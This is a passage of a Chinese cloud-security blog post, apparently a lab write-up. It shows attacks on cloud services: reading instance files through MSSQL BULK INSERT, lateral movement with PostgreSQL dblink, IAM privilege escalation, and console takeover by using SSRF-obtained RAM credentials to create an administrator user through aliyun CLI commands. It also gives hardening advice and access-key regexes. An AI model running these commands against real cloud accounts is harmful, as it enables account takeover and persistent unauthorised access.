+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">create table #testtable(context ntext);
+</span></span><span class="line"><span class="cl">BULK INSERT #testtable FROM &#39;C:\ProgramData\Amazon\EC2Launch\log\agent.log&#39;
+</span></span><span class="line"><span class="cl">WITH (DATAFILETYPE = &#39;char&#39;,KEEPNULLS)
+</span></span><span class="line"><span class="cl">select * from #testtable
+</span></span><span class="line"><span class="cl">drop table #testtable;
+</span></span></code></pre></div><h4 id="postgresql数据库ssrf">PostgreSQL数据库SSRF</h4>
+<p>如果获得了 PostgreSQL 数据库权限，可以通过 PostgreSQL 中的 dblink 插件横向到其他同网段数据库，这里以 AWS RDS 为例</p>
+<p>比如在无法通过外部网络连接另一目标PostgreSQL，就可以尝试使用已有PostgreSQL进行横向并执行数据库命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postgresql" data-lang="postgresql"><span class="line"><span class="cl"><span class="k">create</span> <span class="k">extension</span> <span class="n">dblink</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="n">dblink_connect</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,</span><span class="s1">&#39;host=x.x.x.x port=xxx user=xxx password=xxx dbname=postgres sslmode=disable&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">create</span> <span class="k">table</span> <span class="n">t</span><span class="p">(</span><span class="n">id</span> <span class="nb">int</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">dblink_send_query</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="s1">&#39;select version();&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">dblink_get_result</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">t</span><span class="p">(</span><span class="n">res</span> <span class="nb">text</span><span class="p">);</span>
+</span></span></code></pre></div><h2 id="身份和访问管理">身份和访问管理</h2>
+<p>用于允许用户创建和管理云账户、用户组、角色、权限策略，并控制谁可以访问特定的资源，以及他们可以对这些资源执行哪些操作</p>
+<p>国内各厂商叫法各不相同：RAM、CAM、IAM&hellip;&hellip;</p>
+<p>阿里云的RAM：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225171649938.png" alt="image-20250225171649938"></p>
+<h3 id="iam权限操作">IAM权限操作</h3>
+<h4 id="权限提升">权限提升</h4>
+<p>若当前用户具备编辑 IAM 策略的权限，但没有某些服务权限的话，那么可以在 IAM 中开启这个服务权限，以实现提权</p>
+<p>RAM中也有同样的功能点：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225171852493.png" alt="image-20250225171852493"></p>
+<h4 id="权限维持">权限维持</h4>
+<p>原理也比较简单，直接在 IAM 中创建一个拥有高权限的用户即可：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225172057463.png" alt="image-20250225172057463"></p>
+<p>创建用户后赋予管理权限即可，但国内通常都需要安全验证，所以比较有难度：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225172310800.png" alt="image-20250225172310800"></p>
+<h3 id="控制台接管">控制台接管</h3>
+<p>在上面我们提到了通过SSRF读取ECS的元数据以及user-data，其实我们还可以进一步利用，获取该云账户的所有阿里云服务权限：</p>
+<ul>
+<li>
+<p>首先分析一下我们获取到的元数据：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225195115504.png" alt="image-20250225195115504"></p>
+<p>可以看到这里存在ram/目录，说明当前云服务器配置了RAM角色，这样我们可以尝试获取临时凭证</p>
+</li>
+<li>
+<p>我们访问ram/：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225195615220.png" alt="image-20250225195615220"></p>
+</li>
+<li>
+<p>这里有一个security-credentials/，存储了RAM角色名称信息：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225195833968.png" alt="image-20250225195833968"></p>
+<p>可以看到RAM角色为huocorp-terraform-goat-role</p>
+</li>
+<li>
+<p>访问角色内容获得临时凭证：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225200024236.png" alt="image-20250225200024236"></p>
+</li>
+<li>
+<p>将该临时凭证配置到aliyun命令行工具：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">aliyun configure --mode StsToken
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225200632552.png" alt="image-20250225200632552"></p>
+</li>
+<li>
+<p>配置好之后我们就可以来创建子账户并赋予管理员权限了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">aliyun ram CreateUser --UserName yuyoung
+</span></span><span class="line"><span class="cl">aliyun ram CreateLoginProfile --UserName yuyoung --Password Yuy0ung@666
+</span></span><span class="line"><span class="cl">aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName yuyoung
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225201627328.png" alt="image-20250225201627328"></p>
+</li>
+<li>
+<p>接下来就可以通过新创建的RAM用户进行登录了https://signin.aliyun.com/login.htm#/main，这里的用户格式为 username@company-alias，其中 username 就是刚刚创建的用户名，company-alias 可以通过下面的这个命令获取到：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">aliyun ram GetAccountAlias
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225201956754.png" alt="image-20250225201956754"></p>
+</li>
+<li>
+<p>登陆：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225202037052.png" alt="image-20250225202037052"></p>
+</li>
+<li>
+<p>密码为我们创建的密码：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225202134660.png" alt="image-20250225202134660"></p>
+</li>
+<li>
+<p>阿里云会强制你绑定MFA设备，使用任意手机绑定即可：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225203725485.png" alt="image-20250225203725485"></p>
+</li>
+<li>
+<p>绑定设备后即可成功接管控制台：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225202453925.png" alt="image-20250225202453925"></p>
+</li>
+</ul>
+<p>接下来对这个靶场案例进行分析：</p>
+<p>这个环境的问题除了存在SSRF，还有另外两个问题：</p>
+<ul>
+<li>RAM角色权限过大，导致可以通过该角色的权限进行创建子用户以及给子用户授予高权限等操作</li>
+<li>云数据未作访问加固，导致一旦目标存在SSRF或权限被获取，元数据就存在被获取的风险</li>
+</ul>
+<p>针对第一个 RAM 角色权限过大的问题，主要还是需要使用者严格遵守权限最小化的原则，在为 RAM 角色赋予权限时，避免赋予过高的权限，只赋予自己所需要的权限，这样可以将影响程度降到最低</p>
+<p>针对第二个问题，可以将实例上的元数据访问模式设置为加固模式，方法有两种：</p>
+<ul>
+<li>
+<p>1.在创建实例时，可以在「系统配置」的「高级选项」中将「实例元数据访问模式」设置为「仅加固模式」</p>
+</li>
+<li>
+<p>2.在已经创建好的实例中，可以在阿里云 OpenAPI 中开启元数据强制使用 Token 访问，OpenAPI 地址：https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225211012735.png" alt="image-20250225211012735"></p>
+</li>
+<li>
+<p>配置后就无法SSRF访问了，提示403：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225212948645.png" alt="image-20250225212948645"></p>
+</li>
+<li>
+<p>当然，如果实例权限被获取了，这种方法就不行了，可以这样获取元数据：</p>
+<ul>
+<li>
+<p>先获取token：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">TOKEN</span><span class="o">=</span><span class="sb">`</span>curl -X PUT <span class="s2">&#34;http://100.100.100.200/latest/api/token&#34;</span> -H <span class="s2">&#34;X-aliyun-ecs-metadata-token-ttl-seconds: 21600&#34;</span><span class="sb">`</span>
+</span></span></code></pre></div></li>
+<li>
+<p>再通过token获取元数据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -H <span class="s2">&#34;X-aliyun-ecs-metadata-token: </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span>  http://100.100.100.200/latest/meta-data/
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225214510580.png" alt="image-20250225214510580"></p>
+</li>
+</ul>
+</li>
+</ul>
+<p>完事记得删除创建的账号：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">aliyun ram DetachPolicyFromUser --PolicyType System --PolicyName AdministratorAccess --UserName yuyoung
+</span></span><span class="line"><span class="cl">aliyun ram DeleteUser --UserName yuyoung
+</span></span></code></pre></div><p>还要记得把ak改回来：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">aliyun configure --mode AK
+</span></span></code></pre></div><p>最后，给出这个上面方法的几个前提：</p>
+<ul>
+<li>ECS 实例需要被授予 RAM 角色，不然访问临时凭证的元数据会返回 404</li>
+<li>RAM 角色需要具备 ram 访问控制的相关操作权限，例如创建用户、赋予权限等，不然临时秘钥会没有创建子用户的权限</li>
+</ul>
+<blockquote>
+<p>在实战中，如果遇到了 ECS 实例被授予了 RAM 角色的情况，大多时候该角色都是不具备创建用户权限的，这时就没法通过创建子账号登录控制台的方式了，只能通过阿里云命令行工具去操作目标云服务了</p>
+</blockquote>
+<p>我们在这里也可以总结书一些云上攻防相比传统内网攻防的不同：</p>
+<ul>
+<li>云上攻防的常见问题是配置错误</li>
+<li>云上攻防的权限维持主要方法是创建 RAM 高权限用户，而不是像传统攻防里那样有五花八门的权限维持方法</li>
+<li>云上攻防的内网横向主要是在云服务厂商命令行或者控制台中进行横向，从这个云服务横向到另一个云服务，而不是像传统攻防那样有各种各样的内网横向手法</li>
+</ul>
+<h2 id="杂谈">杂谈</h2>
+<p>记录一些属于云服务但是不好分类的的零碎知识与Tricks</p>
+<h3 id="ak特征整理">AK特征整理</h3>
+<p>记录一下不同云服务对应AK的正则：</p>
+<h4 id="amazon-web-services">Amazon Web Services</h4>
+<p>亚马逊云计算服务 (Amazon Web Services, AWS) 的 Access Key 开头标识一般是 &ldquo;AKIA&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">AKIA</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">16</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><ul>
+<li>Access Key ID: 20个随机的大写字母和数字组成的字符，例如 AKHDNAPO86BSHKDIRYTE</li>
+<li>Secret Access Key ID: 40个随机的大小写字母组成的字符，例如 S836fh/J73yHSb64Ag3Rkdi/jaD6sPl6/antFtU（无法找回丢失的 Secret Access Key ID）。</li>
+</ul>
+<h4 id="google-cloud-platform">Google Cloud Platform</h4>
+<p>Google Cloud Platform (GCP) 的 Access Key 开头标识一般是 &ldquo;GOOG&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">GOOG</span><span class="o">[</span><span class="err">\</span><span class="nt">w</span><span class="err">\</span><span class="nt">W</span><span class="o">]</span><span class="p">{</span><span class="err">10,30</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><ul>
+<li>服务账号的JSON文件中包含了Access Key和密钥的信息，其中Access Key为<code>client_email</code>，其长度不固定，由字母、数字和特殊字符组成。</li>
+<li>密钥（Key）的长度为256个字符，由字母、数字和特殊字符组成。</li>
+</ul>
+<h4 id="microsoft-azure">Microsoft Azure</h4>
+<p>Microsoft Azure 的 Access Key 开头标识一般是 &ldquo;AZ&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">AZ</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">34,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><ul>
+<li>Azure AD Application的Client ID通常用作Access Key，长度为36个字符，由字母和数字组成。</li>
+<li>对于Azure AD Application的密钥（Secret），长度为44个字符，由字母、数字和特殊字符组成。</li>
+</ul>
+<h4 id="ibm-cloud">IBM Cloud</h4>
+<p>IBM 云 (IBM Cloud) 的 Access Key 开头标识一般是 &ldquo;IBM&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">IBM</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><p>或者是以下规则：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">[</span><span class="nt">a-zA-Z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">8</span><span class="p">}</span><span class="o">(</span><span class="nt">-</span><span class="o">[</span><span class="nt">a-zA-Z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">4</span><span class="p">}</span><span class="o">)</span><span class="p">{</span><span class="err">3</span><span class="p">}</span><span class="nt">-</span><span class="o">[</span><span class="nt">a-zA-Z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">12</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="oracle-cloud">Oracle Cloud</h4>
+<p>Oracle云 (Oracle Cloud) 的 Access Key 开头标识一般是 &ldquo;OCID&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">OCID</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="阿里云">阿里云</h4>
+<p>阿里云 (Alibaba Cloud) 的 Access Key 开头标识一般是 &ldquo;LTAI&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">LTAI</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">12,20</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><ul>
+<li>Access Key ID长度为16-24个字符，由大写字母和数字组成。</li>
+<li>Access Key Secret长度为30个字符，由大写字母、小写字母和数字组成。</li>
+</ul>
+<h4 id="腾讯云">腾讯云</h4>
+<p>腾讯云 (Tencent Cloud) 的 Access Key 开头标识一般是 &ldquo;AKID&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">AKID</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">13,20</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><ul>
+<li>SecretId长度为17个字符，由字母和数字组成。</li>
+<li>SecretKey长度为40个字符，由字母和数字组成。</li>
+</ul>
+<h4 id="华为云">华为云</h4>
+<p>华为云 (Huawei Cloud) 的 Access Key 是20个随机大写字母和数字组成，较难用正则表达式匹配。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">[</span><span class="nt">A-Z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">20</span><span class="p">}</span>
+</span></span></code></pre></div><h4 id="百度云">百度云</h4>
+<p>百度云 (Baidu Cloud) 的 Access Key 开头标识一般是 &ldquo;AK&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">AK</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="京东云">京东云</h4>
+<p>京东云 (JD Cloud) 的 Access Key 开头标识一般是 &ldquo;JDC_&quot;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">JDC_</span><span class="o">[</span><span class="nt">A-Z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">28,32</span><span class="p">}</span>
+</span></span></code></pre></div><h4 id="字节跳动火山引擎">字节跳动火山引擎</h4>
+<p>字节跳动火山引擎 (Volcengine) 的 Access Key 开头标识一般是 &ldquo;AKLT&rdquo;，长度小于256位。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">AKLT</span><span class="o">[</span><span class="nt">a-zA-Z0-9-_</span><span class="o">]</span><span class="p">{</span><span class="err">0,252</span><span class="p">}</span>
+</span></span></code></pre></div><h4 id="ucloud">UCloud</h4>
+<p>UCloud (UCloud) 的 Access Key 开头标识一般是 &ldquo;UC&rdquo;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">UC</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="青云">青云</h4>
+<p>青云 (QingCloud) 的 Access Key 开头标识一般是 &ldquo;QY&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">QY</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="金山云">金山云</h4>
+<p>金山云 (Kingsoft Cloud) 的 Access Key 开头标识一般是 &ldquo;AKLT&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">AKLT</span><span class="o">[</span><span class="nt">a-zA-Z0-9-_</span><span class="o">]</span><span class="p">{</span><span class="err">16,28</span><span class="p">}</span>
+</span></span></code></pre></div><h4 id="联通云">联通云</h4>
+<p>联通云 (China Unicom Cloud) 的 Access Key 开头标识一般是 &ldquo;LTC&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">LTC</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,60</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="移动云">移动云</h4>
+<p>移动云 (China Mobile Cloud) 的 Access Key 开头标识一般是 &ldquo;YD&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">YD</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,60</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="电信云">电信云</h4>
+<p>中国电信云 (China Telecom Cloud) 的 Access Key 开头标识一般是 &ldquo;CTC&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">CTC</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,60</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="一云通">一云通</h4>
+<p>一云通 (YiYunTong Cloud) 的 Access Key 开头标识一般是 &ldquo;YYT&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">YYT</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,60</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="用友云">用友云</h4>
+<p>用友云 (Yonyou Cloud) 的 Access Key 开头标识一般是 &ldquo;YY&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">YY</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="南大通用云">南大通用云</h4>
+<p>南大通用云 (OUCDC) 的 Access Key 开头标识一般是 &ldquo;CI&rdquo;。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">CI</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,40</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="g-core-labs">G-Core Labs</h4>
+<p>G-Core Labs 的 Access Key 开头标识一般是 &ldquo;gcore&rdquo;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">^</span><span class="nt">gcore</span><span class="o">[</span><span class="nt">A-Za-z0-9</span><span class="o">]</span><span class="p">{</span><span class="err">10,30</span><span class="p">}</span><span class="o">$</span>
+</span></span></code></pre></div>
+    </article>
+    <p style="text-align: center; margin-top: 50px; opacity: 0.6; font-size: 0.9em;">总是在探索未知</p>
+
+  </div>
+  <div class="sidebar-right">
+    <h3>大纲</h3>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#云服务学习">云服务学习</a>
+      <ul>
+        <li><a href="#对象存储">对象存储</a>
+          <ul>
+            <li><a href="#bucket爆破">Bucket爆破</a></li>
+            <li><a href="#bucket接管">Bucket接管</a></li>
+            <li><a href="#任意文件上传">任意文件上传</a></li>
+            <li><a href="#bucket-acl-可写">Bucket ACL 可写</a></li>
+            <li><a href="#object-acl-可写">Object ACL 可写</a></li>
+            <li><a href="#bucket-策略可写">Bucket 策略可写</a></li>
+            <li><a href="#bucket-object-遍历">Bucket Object 遍历</a></li>
+            <li><a href="#特殊的bucket-策略">特殊的Bucket 策略</a></li>
+          </ul>
+        </li>
+        <li><a href="#弹性计算">弹性计算</a>
+          <ul>
+            <li><a href="#弹性计算面临的风险">弹性计算面临的风险</a>
+              <ul>
+                <li><a href="#1凭证泄露">1.凭证泄露</a></li>
+                <li><a href="#2元数据">2.元数据</a></li>
+                <li><a href="#3账号劫持">3.账号劫持</a></li>
+                <li><a href="#4恶意的镜像">4.恶意的镜像</a></li>
+                <li><a href="#5其他的初始访问方法">5.其他的初始访问方法</a></li>
+              </ul>
+            </li>
+            <li><a href="#使用用户数据执行命令">使用用户数据执行命令</a></li>
+            <li><a href="#弹性计算下的权限维持">弹性计算下的权限维持</a>
+              <ul>
+                <li><a href="#1用户数据">1.用户数据</a></li>
+                <li><a href="#2后门镜像">2.后门镜像</a></li>
+                <li><a href="#3创建访问密钥">3.创建访问密钥</a></li>
+                <li><a href="#4创建辅助账号">4.创建辅助账号</a></li>
+              </ul>
+            </li>
+            <li><a href="#获取共享快照数据">获取共享快照数据</a></li>
+          </ul>
+        </li>
+        <li><a href="#rds云数据库">RDS云数据库</a>
+          <ul>
+            <li><a href="#rds信息收集">RDS信息收集</a>
+              <ul>
+                <li><a href="#mssql读取实例信息">MSSQL读取实例信息</a></li>
+                <li><a href="#postgresql数据库ssrf">PostgreSQL数据库SSRF</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#身份和访问管理">身份和访问管理</a>
+          <ul>
+            <li><a href="#iam权限操作">IAM权限操作</a>
+              <ul>
+                <li><a href="#权限提升">权限提升</a></li>
+                <li><a href="#权限维持">权限维持</a></li>
+              </ul>
+            </li>
+            <li><a href="#控制台接管">控制台接管</a></li>
+          </ul>
+        </li>
+        <li><a href="#杂谈">杂谈</a>
+          <ul>
+            <li><a href="#ak特征整理">AK特征整理</a>
+              <ul>
+                <li><a href="#amazon-web-services">Amazon Web Services</a></li>
+                <li><a href="#google-cloud-platform">Google Cloud Platform</a></li>
+                <li><a href="#microsoft-azure">Microsoft Azure</a></li>
+                <li><a href="#ibm-cloud">IBM Cloud</a></li>
+                <li><a href="#oracle-cloud">Oracle Cloud</a></li>
+                <li><a href="#阿里云">阿里云</a></li>
+                <li><a href="#腾讯云">腾讯云</a></li>
+                <li><a href="#华为云">华为云</a></li>
+                <li><a href="#百度云">百度云</a></li>
+                <li><a href="#京东云">京东云</a></li>
+                <li><a href="#字节跳动火山引擎">字节跳动火山引擎</a></li>
+                <li><a href="#ucloud">UCloud</a></li>
+                <li><a href="#青云">青云</a></li>
+                <li><a href="#金山云">金山云</a></li>
+                <li><a href="#联通云">联通云</a></li>
+                <li><a href="#移动云">移动云</a></li>
+                <li><a href="#电信云">电信云</a></li>
+                <li><a href="#一云通">一云通</a></li>
+                <li><a href="#用友云">用友云</a></li>
+                <li><a href="#南大通用云">南大通用云</a></li>
+                <li><a href="#g-core-labs">G-Core Labs</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+  </main>
+  
+  
+  <div id="search-modal" class="search-modal">
+    <div class="search-modal-content">
+      
+      <div class="mobile-search-header" style="display: none;">
+        <button id="mobile-exit-btn" class="mobile-icon-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        </button>
+      </div>
+
+      <div class="search-input-wrapper">
+        <input type="text" id="search-input" placeholder="搜索文章标题或内容...">
+        <button id="mobile-search-btn" class="mobile-icon-btn mobile-search-submit" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        </button>
+        <span class="search-loading" style="display: none;">第一次加载搜索功能可能需要一点时间...</span>
+      </div>
+      <div id="search-results" class="search-results"></div>
+      <div class="search-footer">
+        <span class="desktop-only">ESC 关闭</span>
+        <span class="desktop-only">↑↓ 选择</span>
+        <span class="desktop-only">Enter 跳转</span>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs';
+
+  mermaid.initialize({ 
+    startOnLoad: false,
+    theme: document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default',
+    securityLevel: 'loose'
+  });
+
+  document.addEventListener('DOMContentLoaded', async () => {
+    
+    await mermaid.run({
+      querySelector: '.mermaid'
+    });
+  });
+</script>
+
+</body>
+</html>
